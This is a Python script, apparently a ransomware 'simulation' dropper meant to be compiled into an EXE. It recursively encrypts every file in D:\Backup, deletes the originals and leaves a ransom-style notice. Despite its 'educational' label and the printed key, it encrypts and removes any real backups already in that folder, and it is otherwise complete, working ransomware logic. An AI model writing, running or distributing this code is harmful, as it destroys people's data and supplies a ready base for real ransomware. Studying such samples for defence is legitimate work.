#!/usr/bin/env python3
"""
BACKUP FOLDER ENCRYPTOR - EXE-FRIENDLY VERSION
Educational ransomware simulation dropper with proper EXE handling
"""

import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet
import time

def main():
    # Pre-generated encryption key (embedded in EXE)
    key = b'YOUR_ENCRYPTION_KEY_HERE_REPLACE_THIS'  # This will be replaced during EXE creation
    cipher = Fernet(key)
    target_dir = Path(r"D:\Backup")  # Default target
    extension = ".backup_locked"
    
    print("=" * 60)
    print("BACKUP FOLDER ENCRYPTION DROPPER")
    print("=" * 60)
    print(f"Target Directory: {target_dir}")
    print("=" * 60)
    
    # Display key for educational purposes
    print(f"[KEY] {base64.b64encode(key).decode()}")
    print("")
    
    if not target_dir.exists():
        target_dir.mkdir(parents=True)
        print("[INFO] Created target directory")
        
        # Create demo files
        demo_files = {
            "important_backup.txt": "This is important backup data",
            "family_photos.zip": "Family photos archive",
            "work_documents.rar": "Work documents",
            "financial_records.xlsx": "Financial records"
        }
        
        for filename, content in demo_files.items():
            file_path = target_dir / filename
            with open(file_path, 'w') as f:
                f.write(content)
        print("[INFO] Created demo files for testing")
    
    print(f"[TARGET] Encrypting files in {target_dir}")
    time.sleep(1)  # Dramatic pause
    
    encrypted_count = 0
    for file_path in target_dir.rglob("*"):
        if file_path.is_file() and not file_path.name.endswith(extension):
            try:
                print(f"[ENCRYPTING] {file_path.name}")
                
                with open(file_path, 'rb') as f:
                    data = f.read()
                    
                encrypted_data = cipher.encrypt(data)
                new_path = str(file_path) + extension
                
                with open(new_path, 'wb') as f:
                    f.write(encrypted_data)
                    
                file_path.unlink()
                encrypted_count += 1
                print(f"  -> Successfully encrypted")
                
            except Exception as e:
                print(f"  -> Failed to encrypt: {e}")
    
    # Create ransom note
    note_content = f"""================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted by educational ransomware.

Target Directory: {target_dir}
Files Encrypted: {encrypted_count}
Extension Added: {extension}

This is an educational simulation designed to demonstrate:
- How ransomware targets backup directories
- The importance of offline backups
- Why backup security is crucial

Educational Purpose Only
================================
"""
    
    note_path = target_dir / "BACKUP_ENCRYPTION_NOTICE.txt"
    with open(note_path, 'w') as f:
        f.write(note_content)
    
    print(f"[NOTE] Created educational notice: {note_path.name}")
    print(f"[COMPLETE] Encrypted {encrypted_count} files")
    print("=" * 60)
    print("BACKUP FOLDER ENCRYPTION COMPLETE")
    print("=" * 60)
    
    # Handle exit gracefully for EXE
    try:
        input("\nPress Enter to exit...")
    except (EOFError, OSError):
        # Handle case where stdin is not available (in EXE)
        print("\nExecution completed. Closing...")
        time.sleep(2)  # Brief pause before closing

if __name__ == "__main__":
    main()